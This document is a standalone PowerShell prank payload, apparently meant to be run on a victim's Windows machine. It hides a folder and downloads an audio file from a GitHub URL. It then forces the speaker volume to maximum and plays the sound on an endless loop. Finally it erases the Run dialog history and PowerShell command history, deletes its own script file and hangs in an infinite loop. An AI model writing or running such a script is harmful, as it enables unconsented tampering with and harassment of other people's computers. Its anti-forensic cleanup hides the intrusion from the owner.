attrib +s +h "$env:USERPROFILE\temp"; iwr "https://raw.githubusercontent.com/Noshbit/miniature-octo-carnival/main/S.wav" -outfile "$env:USERPROFILE\temp\S.wav"; 
$player = New-Object System.Media.SoundPlayer "$env:userprofile\temp\S.wav"
Function Set-SpeakerVolume
{ Param (
  [switch]$min,
  [switch]$max)
  $wshShell = new-object -com wscript.shell
  If ($min)
  {1..50 | % {$wshShell.SendKeys([char]174)}}
  ElseIf ($max)
  {1..50 | % {$wshShell.SendKeys([char]175)}}
  Else
  {$wshShell.SendKeys([char]173)} }
sleep 30;
Set-SpeakerVolume -Max
$player.PlayLooping();
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist; rm "$env:userprofile\temp\1.ps1"
while ($true) {
}
